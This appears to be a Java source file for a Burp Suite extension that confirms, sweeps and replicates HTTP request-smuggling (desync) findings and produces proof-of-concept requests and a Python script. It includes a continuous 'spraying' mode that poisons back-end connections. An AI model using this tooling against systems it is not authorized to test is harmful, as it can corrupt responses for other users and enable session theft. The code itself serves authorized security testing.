package burp;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.ai.chat.Message;
import burp.api.montoya.ai.chat.PromptOptions;
import burp.api.montoya.ai.chat.PromptResponse;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.proxy.ProxyHttpRequestResponse;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.SwingWorker;
import javax.swing.Timer;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.FlowLayout;
import java.awt.Font;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.List;

/**
 * Operator-facing "agent" for confirming and replicating a CL.0 desync finding.
 *
 * <p>It always produces a deterministic, editable Repeater proof-of-concept (via
 * {@link DesyncRepro}) and, when Burp's built-in AI is enabled, asks the model to
 * explain the specific desync and walk through manual replication. The AI layer is
 * strictly additive: everything works without it.</p>
 */
final class DesyncAgentDialog {

    private static final String PROVIDER_OLLAMA = "Local Ollama";
    private static final String PROVIDER_BURP = "Burp AI (built-in)";
    static final String DEFAULT_OLLAMA_URL = "http://localhost:11434";
    static final String DEFAULT_OLLAMA_MODEL = "qwen3.5:27b";

    /** Attack + follow-up pairs on one connection, per PoC type/technique (Run test and each auto-sweep combo). */
    private static final int SINGLE_CONNECTION_ATTEMPTS = 7;

    private final MontoyaApi api;
    private final HttpService service;
    private final byte[] requestBytes;
    private final byte[] responseBytes;
    private final int originalStatus;

    private byte[] workingRequest;

    private final JFrame frame;
    private final JComboBox<DesyncRepro.Type> typeCombo;
    private final JTextField smuggledLineField;
    private final JTextField cookieField;
    private final JLabel sessionStatusLabel;
    private final JTextArea attackArea;
    private final JTextArea attackResponseArea;
    private final JTextArea followUpArea;
    private final JTextArea followUpResponseArea;
    private final JTextArea instructionsArea;
    private final JTextArea testArea;
    private final JButton testButton;
    private final JButton sweepButton;
    private final JButton sprayButton;
    private final JTextArea pythonArea;
    private final JTabbedPane tabs;
    private final JTextArea aiArea;
    private final JButton aiButton;
    private final JComboBox<String> providerCombo;
    private final JTextField ollamaModelField;
    private final JTextField ollamaEndpointField;
    private final JLabel statusLabel;

    private DesyncRepro repro;
    private byte[] confirmedAttackBytes;
    private byte[] confirmedFollowBytes;
    private String confirmedTechnique;
    private boolean confirmedOverH2;
    private volatile boolean sprayStopRequested;
    private SwingWorker<Void, String> sprayWorker;

    private enum ActiveJobKind { NONE, TEST, SWEEP }
    private volatile ActiveJobKind activeJobKind = ActiveJobKind.NONE;
    private volatile boolean jobStopRequested;
    private SwingWorker<String, String> testSweepWorker;

    private Timer elapsedTimer;
    private final String initialTechnique;

    private DesyncAgentDialog(MontoyaApi api, byte[] requestBytes, byte[] responseBytes,
                              HttpService service, DesyncRepro.Type type, String technique,
                              String initialSmuggledLine) {
        this.api = api;
        this.service = service;
        this.requestBytes = requestBytes == null ? new byte[0] : requestBytes.clone();
        this.responseBytes = responseBytes == null ? null : responseBytes.clone();
        this.originalStatus = parseStatus(this.responseBytes);
        this.workingRequest = this.requestBytes.clone();
        this.initialTechnique = technique;

        DesyncRepro.Type resolvedType = type != null ? type : DesyncRepro.typeFromRequest(this.requestBytes);
        // Prefer the exact smuggled gadget the original finding used, so the PoC replicates
        // that finding rather than a synthetic /robots.txt probe.
        String smuggledLine = (initialSmuggledLine == null || initialSmuggledLine.trim().isEmpty())
                ? DesyncRepro.DEFAULT_SMUGGLED_LINE : initialSmuggledLine.trim();

        this.frame = new JFrame("Desync agent — replicate request smuggling");
        this.typeCombo = new JComboBox<>(new DesyncRepro.Type[]{
                DesyncRepro.Type.CL_0, DesyncRepro.Type.CL_TE,
                DesyncRepro.Type.TE_CL, DesyncRepro.Type.UNKNOWN});
        this.typeCombo.setSelectedItem(resolvedType);
        this.smuggledLineField = new JTextField(smuggledLine, 40);
        this.cookieField = new JTextField(extractCookie(this.requestBytes), 48);
        this.sessionStatusLabel = new JLabel(" ");
        this.attackArea = monospace();
        this.attackResponseArea = readOnly();
        this.attackResponseArea.setText(
                "Response to the attack on the same connection appears here after \"Run test now\".");
        this.followUpArea = monospace();
        this.followUpResponseArea = readOnly();
        this.followUpResponseArea.setText(
                "Follow-up response appears here after \"Run test now\" (baseline vs poisoned when desync is detected).");
        this.instructionsArea = readOnly();
        this.testArea = monospace();
        this.testArea.setEditable(false);
        this.testButton = new JButton("Run test now");
        this.sweepButton = new JButton("Auto-sweep");
        this.sprayButton = new JButton("Keep spraying");
        this.pythonArea = monospace();
        this.tabs = new JTabbedPane();
        this.aiArea = readOnly();
        this.aiButton = new JButton("Ask AI agent");
        this.providerCombo = new JComboBox<>(new String[]{PROVIDER_OLLAMA, PROVIDER_BURP});
        this.ollamaModelField = new JTextField(DEFAULT_OLLAMA_MODEL, 14);
        this.ollamaEndpointField = new JTextField(DEFAULT_OLLAMA_URL, 18);
        this.statusLabel = new JLabel(" ");

        regenerate();
        buildUi();
    }

    static void open(MontoyaApi api, byte[] requestBytes, byte[] responseBytes,
                     HttpService service, DesyncRepro.Type type, String technique) {
        open(api, requestBytes, responseBytes, service, type, technique, null);
    }

    /** Builds, populates and shows the agent window on the EDT. */
    static void open(MontoyaApi api, byte[] requestBytes, byte[] responseBytes,
                     HttpService service, DesyncRepro.Type type, String technique,
                     String initialSmuggledLine) {
        if (api == null) {
            return;
        }
        if (requestBytes == null || requestBytes.length == 0) {
            JOptionPane.showMessageDialog(null, "The selected item has no request to diagnose.",
                    "Desync agent", JOptionPane.WARNING_MESSAGE);
            return;
        }
        SwingUtilities.invokeLater(() ->
                new DesyncAgentDialog(api, requestBytes, responseBytes, service, type, technique,
                        initialSmuggledLine).show());
    }

    private void show() {
        frame.setSize(900, 720);
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }

    private void regenerate() {
        DesyncRepro.Type type = (DesyncRepro.Type) typeCombo.getSelectedItem();
        this.repro = DesyncRepro.build(type, workingRequest,
                smuggledLineField == null ? null : smuggledLineField.getText(), initialTechnique);
        if (attackArea != null) {
            attackArea.setText(new String(repro.attackRequest, StandardCharsets.ISO_8859_1));
            attackArea.setCaretPosition(0);
        }
        if (followUpArea != null) {
            followUpArea.setText(new String(repro.followUpRequest, StandardCharsets.ISO_8859_1));
            followUpArea.setCaretPosition(0);
        }
        if (instructionsArea != null) {
            instructionsArea.setText(repro.instructions());
            instructionsArea.setCaretPosition(0);
        }
    }

    private void buildUi() {
        JPanel root = new JPanel(new BorderLayout(0, 6));
        root.setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8));

        JPanel top = new JPanel();
        top.setLayout(new javax.swing.BoxLayout(top, javax.swing.BoxLayout.Y_AXIS));

        JLabel intro = new JLabel("<html>Builds a single-connection CL.0 proof-of-concept for the selected "
                + "request. Validate the session first, then edit/send the requests to Repeater.</html>");
        intro.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel session = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        session.setAlignmentX(Component.LEFT_ALIGNMENT);
        session.add(new JLabel("Cookie:"));
        session.add(cookieField);
        JButton applyCookieBtn = new JButton("Apply to requests");
        applyCookieBtn.setToolTipText("Inject this cookie into the attack and follow-up requests");
        applyCookieBtn.addActionListener(e -> applyCookie());
        session.add(applyCookieBtn);
        JButton refreshCookieBtn = new JButton("Refresh from proxy");
        refreshCookieBtn.setToolTipText("Grab the latest Cookie header for this host from Burp proxy history");
        refreshCookieBtn.addActionListener(e -> refreshCookieFromProxy());
        session.add(refreshCookieBtn);
        JButton validateBtn = new JButton("Validate session");
        validateBtn.setToolTipText("Send the request live with this cookie and check whether the session is still valid");
        validateBtn.addActionListener(e -> validateSession());
        session.add(validateBtn);

        sessionStatusLabel.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel gadget = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        gadget.setAlignmentX(Component.LEFT_ALIGNMENT);
        gadget.add(new JLabel("Desync type:"));
        gadget.add(typeCombo);
        typeCombo.addActionListener(e -> {
            regenerate();
            DesyncRepro.Type t = (DesyncRepro.Type) typeCombo.getSelectedItem();
            setStatus("Switched to " + (t == null ? "" : t.label) + " proof-of-concept.");
        });
        gadget.add(new JLabel("  Smuggled request line:"));
        gadget.add(smuggledLineField);
        JButton regen = new JButton("Regenerate");
        regen.addActionListener(e -> {
            applyCookie();
            setStatus("Regenerated proof-of-concept.");
        });
        gadget.add(regen);

        top.add(intro);
        top.add(session);
        top.add(sessionStatusLabel);
        top.add(gadget);

        testArea.setText("Click \"Run test now\" to have the agent send the attack + follow-up on a "
                + "single connection (" + SINGLE_CONNECTION_ATTEMPTS + " attempts) and check whether the "
                + "follow-up response is poisoned by the smuggled request. Results and responses appear here.");
        tabs.addTab("Test result", new JScrollPane(testArea));
        tabs.addTab("Instructions", new JScrollPane(instructionsArea));
        tabs.addTab("#1 attack", requestResponseSplit(attackArea, attackResponseArea));
        tabs.addTab("#2 Follow-up", requestResponseSplit(followUpArea, followUpResponseArea));
        tabs.addTab("Python PoC", buildPythonPanel());
        tabs.addTab("AI analysis", buildAiPanel());

        JPanel buttons = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 4));
        testButton.setToolTipText("Send the attack + follow-up on one connection ("
                + SINGLE_CONNECTION_ATTEMPTS + " attempts) and check for a desync. "
                + "Click again while running to stop.");
        testButton.addActionListener(e -> runTest());
        buttons.add(testButton);
        sweepButton.setToolTipText("Try desync types, smuggled lines and techniques until one confirms ("
                + SINGLE_CONNECTION_ATTEMPTS + " attempts per combination). Click again while running to stop.");
        sweepButton.addActionListener(e -> runAutoSweep());
        buttons.add(sweepButton);
        sprayButton.setToolTipText("Continuously send the attack through Burp (Proxy history) to poison "
                + "back-end connections while you browse the same host. Click again to stop.");
        sprayButton.addActionListener(e -> toggleContinuousSpray());
        buttons.add(sprayButton);
        JButton sendBtn = new JButton("Send both to Repeater");
        sendBtn.addActionListener(e -> sendToRepeater());
        buttons.add(sendBtn);

        JPanel south = new JPanel(new BorderLayout());
        south.add(buttons, BorderLayout.NORTH);
        statusLabel.setBorder(BorderFactory.createEmptyBorder(2, 6, 2, 6));
        south.add(statusLabel, BorderLayout.SOUTH);

        root.add(top, BorderLayout.NORTH);
        root.add(tabs, BorderLayout.CENTER);
        root.add(south, BorderLayout.SOUTH);
        frame.setContentPane(root);
    }

    private JComponent buildAiPanel() {
        JPanel p = new JPanel(new BorderLayout(0, 6));

        JPanel cfg = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        cfg.add(new JLabel("Provider:"));
        cfg.add(providerCombo);
        cfg.add(new JLabel("Ollama model:"));
        cfg.add(ollamaModelField);
        cfg.add(new JLabel("Endpoint:"));
        cfg.add(ollamaEndpointField);
        cfg.add(aiButton);

        // Default to the local Ollama provider; Burp AI is kept for later.
        providerCombo.setSelectedItem(PROVIDER_OLLAMA);
        Runnable syncProvider = () -> {
            boolean ollama = !PROVIDER_BURP.equals(providerCombo.getSelectedItem());
            ollamaModelField.setEnabled(ollama);
            ollamaEndpointField.setEnabled(ollama);
            if (!ollama && !isAiEnabled()) {
                aiButton.setToolTipText("Burp AI is not enabled yet — switch to Local Ollama.");
            } else {
                aiButton.setToolTipText(null);
            }
        };
        providerCombo.addActionListener(e -> syncProvider.run());
        syncProvider.run();
        aiButton.addActionListener(e -> runAgent());

        aiArea.setText("Pick a provider and click \"Ask AI agent\" to generate a tailored explanation "
                + "and step-by-step replication walkthrough for this finding.\n\n"
                + "Default provider is your local Ollama (" + DEFAULT_OLLAMA_MODEL + " at "
                + DEFAULT_OLLAMA_URL + "). The original request, response and generated PoC are sent to "
                + "that local server only.\n\n"
                + "Burp's built-in AI is available as a provider once it is enabled in Burp.");

        p.add(cfg, BorderLayout.NORTH);
        p.add(new JScrollPane(aiArea), BorderLayout.CENTER);
        return p;
    }

    private JComponent buildPythonPanel() {
        JPanel p = new JPanel(new BorderLayout(0, 6));

        JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        JButton gen = new JButton("Generate from current attack/follow-up");
        gen.setToolTipText("Build a standalone Python h2 PoC from the requests in the #1/#2 tabs");
        gen.addActionListener(e -> {
            generatePythonPoc();
            setStatus("Generated Python PoC — see the Python PoC tab.");
        });
        bar.add(gen);
        JButton save = new JButton("Save .py\u2026");
        save.addActionListener(e -> savePythonPoc());
        bar.add(save);

        pythonArea.setText("Run a test or auto-sweep (or click \"Generate from current attack/follow-up\") "
                + "to build a self-contained Python proof-of-concept here.\n\n"
                + "The script runs CONTINUOUSLY until Ctrl+C: it keeps spraying the smuggling attack to "
                + "poison back-end connections while you browse the same host in your browser. Watch the "
                + "console for [!!!] DESYNC HIT alerts, or look for the smuggled response in the browser.");

        p.add(bar, BorderLayout.NORTH);
        p.add(new JScrollPane(pythonArea), BorderLayout.CENTER);
        return p;
    }

    private void sendToRepeater() {
        byte[] attack = attackArea.getText().getBytes(StandardCharsets.ISO_8859_1);
        byte[] followUp = followUpArea.getText().getBytes(StandardCharsets.ISO_8859_1);
        String clNote = repro.keepUpdateContentLength
                ? "Leave 'Update Content-Length' ON."
                : "Turn 'Update Content-Length' OFF for this " + repro.type.label + " PoC.";
        sendPairToRepeater(attack, followUp, repro.type.label, clNote);
    }

    /** Sends an attack + follow-up pair to Repeater as two labelled tabs. */
    private void sendPairToRepeater(byte[] attack, byte[] followUp, String label, String note) {
        try {
            HttpRequest attackReq = HttpRequest.httpRequest(service, ByteArray.byteArray(attack));
            HttpRequest followReq = HttpRequest.httpRequest(service, ByteArray.byteArray(followUp));
            api.repeater().sendToRepeater(attackReq, label + " attack");
            api.repeater().sendToRepeater(followReq, label + " follow-up");
            setStatus("Sent both requests to Repeater. Group them, use "
                    + "'Send group in sequence (single connection)'. " + (note == null ? "" : note));
        } catch (Throwable t) {
            String detail = t.getMessage() == null ? t.toString() : t.getMessage();
            setStatus("Failed to send to Repeater: " + detail);
            Utilities.err("Desync agent: failed to send to Repeater: " + detail);
        }
    }

    private void applyCookie() {
        String cookie = cookieField.getText() == null ? "" : cookieField.getText().trim();
        workingRequest = applyCookieToBytes(requestBytes, cookie);
        regenerate();
        setStatus(cookie.isEmpty()
                ? "Regenerated PoC (no cookie set)."
                : "Applied cookie to the attack and follow-up requests.");
    }

    /**
     * Pushes the current Cookie field into {@link #workingRequest} and regenerates the PoC, so every
     * test/sweep uses the session as currently entered without the user having to click "Apply"
     * first. Returns a one-line note describing whether a cookie is being used.
     */
    private String syncCookie() {
        String cookie = cookieField.getText() == null ? "" : cookieField.getText().trim();
        workingRequest = applyCookieToBytes(requestBytes, cookie);
        regenerate();
        if (cookie.isEmpty()) {
            return "Session: no cookie set — requests are sent WITHOUT a Cookie header. Paste your "
                    + "session cookie in the Cookie field above if the endpoint needs auth.";
        }
        return "Session: applying Cookie from the field (" + cookie.length() + " chars) to all requests.";
    }

    private void refreshCookieFromProxy() {
        final String targetHost = service == null ? null : service.host();
        if (targetHost == null || targetHost.isEmpty()) {
            setSessionStatus("Cannot refresh: no host for this request.", true);
            return;
        }
        setSessionStatus("Scanning proxy history for " + targetHost + "...", false);
        new SwingWorker<String, Void>() {
            @Override
            protected String doInBackground() {
                try {
                    List<ProxyHttpRequestResponse> history = api.proxy().history();
                    // Walk backwards (newest first) to find the latest Cookie for this host.
                    for (int i = history.size() - 1; i >= 0; i--) {
                        ProxyHttpRequestResponse entry = history.get(i);
                        if (entry == null || entry.finalRequest() == null) continue;
                        HttpRequest req = entry.finalRequest();
                        if (req.httpService() == null) continue;
                        if (!targetHost.equalsIgnoreCase(req.httpService().host())) continue;
                        // Look for a Cookie header.
                        for (HttpHeader h : req.headers()) {
                            if ("Cookie".equalsIgnoreCase(h.name())) {
                                String val = h.value();
                                if (val != null && !val.trim().isEmpty()) {
                                    return val.trim();
                                }
                            }
                        }
                    }
                } catch (Throwable t) {
                    return null;
                }
                return null;
            }

            @Override
            protected void done() {
                try {
                    String cookie = get();
                    if (cookie != null && !cookie.isEmpty()) {
                        cookieField.setText(cookie);
                        applyCookie();
                        setSessionStatus("Cookie refreshed from proxy history (" + cookie.length()
                                + " chars). Click Validate to check.", false);
                        setStatus("Cookie updated from proxy history.");
                    } else {
                        setSessionStatus("No Cookie found for " + targetHost + " in proxy history.", true);
                    }
                } catch (Exception ex) {
                    setSessionStatus("Failed to scan proxy history: " + ex.getMessage(), true);
                }
            }
        }.execute();
    }

    private void validateSession() {
        if (service == null) {
            setSessionStatus("Cannot validate: no HTTP service for this request.", true);
            return;
        }
        final String cookie = cookieField.getText() == null ? "" : cookieField.getText().trim();
        final byte[] probe = applyCookieToBytes(requestBytes, cookie);
        setSessionStatus("Validating session...", false);
        new SwingWorker<String[], Void>() {
            @Override
            protected String[] doInBackground() {
                try {
                    HttpRequest req = HttpRequest.httpRequest(service, ByteArray.byteArray(probe));
                    HttpRequestResponse rr = api.http().sendRequest(req);
                    HttpResponse resp = rr == null ? null : rr.response();
                    if (resp == null) {
                        return new String[]{"invalid", "No response — target unreachable or request rejected."};
                    }
                    return evaluateSession(resp);
                } catch (Throwable t) {
                    String detail = t.getMessage() == null ? t.toString() : t.getMessage();
                    return new String[]{"invalid", "Validation request failed: " + detail};
                }
            }

            @Override
            protected void done() {
                try {
                    String[] result = get();
                    boolean invalid = "invalid".equals(result[0]);
                    setSessionStatus(result[1], invalid);
                    setStatus(invalid ? "Session check: likely invalid." : "Session check: looks valid.");
                } catch (Exception ex) {
                    setSessionStatus("Validation failed: " + ex.getMessage(), true);
                }
            }
        }.execute();
    }

    /** Returns {verdictKey, humanMessage}; verdictKey is "valid" or "invalid". */
    private String[] evaluateSession(HttpResponse resp) {
        short status = resp.statusCode();
        String location = safe(resp.headerValue("Location"));
        int bodyLen = 0;
        try {
            bodyLen = resp.body() == null ? 0 : resp.body().length();
        } catch (Throwable ignored) {
            // ignore
        }
        String body = "";
        try {
            body = resp.bodyToString() == null ? "" : resp.bodyToString().toLowerCase(java.util.Locale.ROOT);
        } catch (Throwable ignored) {
            // ignore
        }

        StringBuilder facts = new StringBuilder("HTTP ").append(status);
        if (!location.isEmpty()) {
            facts.append(" -> ").append(location);
        }
        facts.append(", ").append(bodyLen).append(" body bytes");
        if (originalStatus > 0) {
            facts.append(" (original was HTTP ").append(originalStatus).append(")");
        }

        String loc = location.toLowerCase(java.util.Locale.ROOT);
        boolean loginRedirect = (status >= 300 && status < 400)
                && containsAny(loc, "login", "signin", "sign-in", "auth", "sso", "session", "account/login");
        boolean loginPage = status == 200 && (body.contains("type=\"password\"")
                || body.contains("name=\"password\"") || body.contains(">sign in<")
                || body.contains(">log in<") || body.contains("please log in")
                || body.contains("please sign in"));

        String verdict;
        boolean invalid;
        if (status == 401 || status == 403) {
            invalid = true;
            verdict = "Session likely INVALID — unauthorized.";
        } else if (loginRedirect) {
            invalid = true;
            verdict = "Session likely EXPIRED — redirected to a login/auth endpoint.";
        } else if (loginPage) {
            invalid = true;
            verdict = "Session likely INVALID — response looks like a login page.";
        } else if (originalStatus > 0 && originalStatus < 300 && status >= 300) {
            invalid = true;
            verdict = "Session may be INVALID — status changed from " + originalStatus + " to " + status + ".";
        } else {
            invalid = false;
            verdict = "Session looks VALID.";
        }
        return new String[]{invalid ? "invalid" : "valid", verdict + "  [" + facts + "]"};
    }

    private void setSessionStatus(String text, boolean problem) {
        SwingUtilities.invokeLater(() -> {
            sessionStatusLabel.setForeground(problem ? new Color(0xB00020) : new Color(0x1B7F2A));
            sessionStatusLabel.setText(text == null ? " " : text);
        });
    }

    private static byte[] applyCookieToBytes(byte[] base, String cookie) {
        if (base == null) {
            return new byte[0];
        }
        if (cookie == null || cookie.trim().isEmpty()) {
            return base.clone();
        }
        try {
            return Utilities.addOrReplaceHeader(base, "Cookie", cookie.trim());
        } catch (Throwable t) {
            return base.clone();
        }
    }

    private static String extractCookie(byte[] req) {
        try {
            String value = Utilities.getHeader(req, "Cookie");
            return value == null ? "" : value;
        } catch (Throwable t) {
            return "";
        }
    }

    private static int parseStatus(byte[] responseBytes) {
        if (responseBytes == null || responseBytes.length == 0) {
            return 0;
        }
        String s = new String(responseBytes, StandardCharsets.ISO_8859_1);
        int nl = s.indexOf('\n');
        String firstLine = nl < 0 ? s : s.substring(0, nl);
        String[] parts = firstLine.trim().split("\\s+");
        if (parts.length >= 2) {
            try {
                return Integer.parseInt(parts[1].trim());
            } catch (NumberFormatException ignored) {
                return 0;
            }
        }
        return 0;
    }

    private static boolean containsAny(String haystack, String... needles) {
        if (haystack == null || haystack.isEmpty()) {
            return false;
        }
        for (String n : needles) {
            if (n != null && !n.isEmpty() && haystack.contains(n)) {
                return true;
            }
        }
        return false;
    }

    private static String safe(String s) {
        return s == null ? "" : s;
    }

    private void runTest() {
        if (service == null) {
            appendTest("\nCannot run: no HTTP service for this request.");
            return;
        }
        if (activeJobKind == ActiveJobKind.TEST) {
            requestStopTestOrSweep();
            return;
        }
        if (activeJobKind != ActiveJobKind.NONE) {
            return;
        }
        // Re-apply the current cookie before snapshotting the PoC bytes so the session is included.
        final String cookieNote = syncCookie();
        final String userSmuggledLine = currentSmuggledLine();
        final byte[] attackBytes = ChunkContentScan.bypassContentLengthFix(
                attackArea.getText().getBytes(StandardCharsets.ISO_8859_1));
        final byte[] followBytes = followUpArea.getText().getBytes(StandardCharsets.ISO_8859_1);
        final String label = repro.type.label;
        final String smuggledLine = repro.smuggledLine;

        jobStopRequested = false;
        activeJobKind = ActiveJobKind.TEST;
        setTestSweepJobUi(ActiveJobKind.TEST);
        testArea.setText("Running " + label + " single-connection test...\n");
        appendTest(cookieNote);
        clearCapturedResponses();
        setStatus("Running desync test...");

        testSweepWorker = new SwingWorker<String, String>() {
            final Resp[] capturedAttack = new Resp[1];
            final Resp[] capturedFollow = new Resp[1];
            final Resp[] capturedBaseline = new Resp[1];

            @Override
            protected String doInBackground() {
                try {
                    IHttpService svc = Utilities.helpers.buildHttpService(
                            service.host(), service.port(), service.secure());

                    // Warmup: prime the connection pool so the first real attempt
                    // doesn't land on a cold backend / WAF challenge.
                    publish("Warmup: priming connection...");
                    tryBaseline(svc, followBytes);

                    publish("Baseline: sending the follow-up request on its own...");
                    Resp base1 = tryBaseline(svc, followBytes);
                    capturedBaseline[0] = base1;
                    if (base1 == null) {
                        if (originalReachable(svc)) {
                            return runH2Confirmation(svc, workingRequest.clone(), initialTechnique,
                                    userSmuggledLine, this::publish);
                        }
                        return "UNREACHABLE: " + unreachableDiagnosis(svc);
                    }
                    Resp base2 = tryBaseline(svc, followBytes);
                    boolean stable = base2 != null && !base2.failed() && similar(base1, base2);
                    publish("Baseline follow-up: HTTP " + base1.getStatus() + ", "
                            + respLen(base1) + " bytes" + (stable ? " (stable)" : " (UNSTABLE — results may be noisy)"));

                    int attempts = SINGLE_CONNECTION_ATTEMPTS;
                    int totalSingleConn = 0;
                    int totalPoisoned = 0;
                    int totalSkipped = 0;
                    Resp evidence = null;

                    // Up to 2 rounds: if first round gets 0 hits but many attempts
                    // were wasted (multi-conn / failures), run a second pass.
                    for (int round = 1; round <= 2; round++) {
                        if (round == 2) {
                            if (totalPoisoned > 0 || totalSkipped < 2) {
                                break;
                            }
                            // Refresh baseline before retry — target may have drifted.
                            publish("\nRetrying: " + totalSkipped + " of " + attempts
                                    + " attempts were unusable. Refreshing baseline...");
                            Resp freshBase = tryBaseline(svc, followBytes);
                            if (freshBase != null && !freshBase.failed()) {
                                base1 = freshBase;
                                capturedBaseline[0] = freshBase;
                                publish("Refreshed baseline: HTTP " + base1.getStatus()
                                        + ", " + respLen(base1) + " bytes");
                            }
                            totalSkipped = 0;
                        }

                        publish((round == 1 ? "Running " : "Round 2: running ") + attempts
                                + " single-connection attempts (attack -> follow-up)...");
                        for (int i = 1; i <= attempts; i++) {
                            if (stopRequested()) {
                                return stoppedByUserMessage("test");
                            }
                            byte[] bustedFollow = Utilities.addCacheBuster(followBytes, null);
                            TurboHelper helper = new TurboHelper(svc, true);
                            helper.queue(attackBytes);
                            helper.queue(bustedFollow);
                            List<Resp> results = helper.waitFor();
                            int conns = helper.getConnectionCount();
                            if (results == null || results.size() < 2 || results.get(1) == null
                                    || results.get(1).failed()) {
                                totalSkipped++;
                                publish("  attempt " + i + ": no usable follow-up response, skipping.");
                                continue;
                            }
                            if (conns > 1) {
                                totalSkipped++;
                                publish("  attempt " + i + ": front-end used " + conns
                                        + " connections (not single) — retrying.");
                                continue;
                            }
                            totalSingleConn++;
                            Resp attackR = results.get(0);
                            Resp p = results.get(1);
                            if (capturedAttack[0] == null && attackR != null && !attackR.failed()) {
                                capturedAttack[0] = attackR;
                                capturedFollow[0] = p;
                            }
                            if (!similar(p, base1)) {
                                totalPoisoned++;
                                if (evidence == null) {
                                    evidence = p;
                                }
                                capturedAttack[0] = attackR;
                                capturedFollow[0] = p;
                                publish("  attempt " + i + ": FOLLOW-UP CHANGED — HTTP " + base1.getStatus()
                                        + " -> " + p.getStatus() + ", " + respLen(base1) + " -> " + respLen(p)
                                        + " bytes  [desync signal]");
                            } else {
                                publish("  attempt " + i + ": follow-up unchanged (HTTP " + p.getStatus() + ").");
                            }
                        }
                    }

                    StringBuilder verdict = new StringBuilder("\n========================================\n");
                    if (totalSingleConn == 0) {
                        verdict.append("INCONCLUSIVE — the front-end never kept both requests on one\n")
                                .append("connection, so a desync cannot be demonstrated this way. The target\n")
                                .append("may not reuse connections, or may require HTTP/2.\n");
                    } else if (totalPoisoned > 0) {
                        verdict.append("DESYNC CONFIRMED (").append(totalPoisoned).append("/").append(totalSingleConn)
                                .append(" single-connection attempts).\n")
                                .append("The follow-up response was poisoned by the smuggled request\n")
                                .append("(").append(smuggledLine).append("). The attack + follow-up shown in the\n")
                                .append("'#1 attack' / '#2 Follow-up' tabs are your working PoC.\n");
                        if (!stable) {
                            verdict.append("Caution: the baseline was unstable, so confirm the change is the\n")
                                    .append("smuggled response and not normal page variation.\n");
                        }
                        if (evidence != null) {
                            verdict.append("\n--- BASELINE follow-up response (first ~1200 bytes) ---\n");
                            verdict.append(truncate(respString(base1), 1200));
                            verdict.append("\n\n--- POISONED follow-up response (first ~1200 bytes) ---\n");
                            verdict.append(truncate(respString(evidence), 1200));
                        }
                    } else {
                        // TurboHelper pair approach didn't trigger it. Fall back to the
                        // scanner's own self-poison loop — the exact same code that found
                        // the issue originally. This handles HTTP/2-only targets and cases
                        // where Burp's HTTP engine connection reuse behaves differently
                        // from TurboHelper's raw socket.
                        verdict.append("NOT OBSERVED via single-connection pairs (").append(totalSingleConn)
                                .append(" attempts).\n")
                                .append("Falling back to scanner-style self-poison detection...\n");
                        publish(verdict.toString());

                        String scannerResult = runScannerStyleFallback(
                                svc, workingRequest.clone(), userSmuggledLine, this::publish);
                        if (scannerResult != null) {
                            return scannerResult;
                        }
                        return "\n========================================\n"
                                + "NOT CONFIRMED by either method.\n"
                                + "The follow-up response never changed, and the scanner-style\n"
                                + "self-poison loop also did not trigger. The target may not be\n"
                                + "vulnerable to " + label + " with this request, or it needs a\n"
                                + "different smuggled request/technique. Try auto-sweep.\n";
                    }
                    return verdict.toString();
                } catch (Throwable t) {
                    String detail = t.getMessage() == null ? t.toString() : t.getMessage();
                    return "\nTest failed: " + detail;
                }
            }

            @Override
            protected void process(List<String> chunks) {
                for (String c : chunks) {
                    appendTest(c);
                }
            }

            @Override
            protected void done() {
                try {
                    displayCapturedResponses(capturedBaseline[0], capturedAttack[0], capturedFollow[0]);
                    appendTest(get());
                    String verdict = testArea.getText();
                    if (verdict.contains("STOPPED")) {
                        setStatus("Test stopped.");
                    } else if (verdict.contains("DESYNC CONFIRMED")) {
                        generatePythonPoc();
                        setStatus("Desync CONFIRMED — PoC loaded. Use \"Send both to Repeater\" if needed.");
                    } else if (verdict.contains("CONFIRMED") && !verdict.contains("NOT CONFIRMED")) {
                        // HTTP/2 path already loaded/sent the confirmed request itself.
                        setStatus("Desync CONFIRMED — see Test result tab.");
                    } else if (verdict.contains("INCONCLUSIVE")) {
                        setStatus("Test inconclusive (connection not reused).");
                    } else {
                        setStatus("Test finished — desync not observed.");
                    }
                } catch (Exception ex) {
                    appendTest("\nTest failed: " + ex.getMessage());
                    setStatus("Test failed.");
                } finally {
                    finishTestOrSweepJob();
                }
            }
        };
        testSweepWorker.execute();
    }

    private void runAutoSweep() {
        if (service == null) {
            appendTest("\nCannot run: no HTTP service for this request.");
            return;
        }
        if (activeJobKind == ActiveJobKind.SWEEP) {
            requestStopTestOrSweep();
            return;
        }
        if (activeJobKind != ActiveJobKind.NONE) {
            return;
        }
        // Re-apply the current cookie so the snapshot used by the whole sweep carries the session.
        final String cookieNote = syncCookie();
        final String userSmuggledLine = currentSmuggledLine();
        final byte[] reqSnapshot = workingRequest.clone();
        final DesyncRepro.Type primary = (DesyncRepro.Type) typeCombo.getSelectedItem();

        jobStopRequested = false;
        activeJobKind = ActiveJobKind.SWEEP;
        setTestSweepJobUi(ActiveJobKind.SWEEP);
        testArea.setText("Auto-sweep: trying desync types, smuggled requests and techniques until one "
                + "is confirmed...\n");
        appendTest(cookieNote);
        clearCapturedResponses();
        setStatus("Auto-sweeping...");

        final String[] winLine = new String[1];
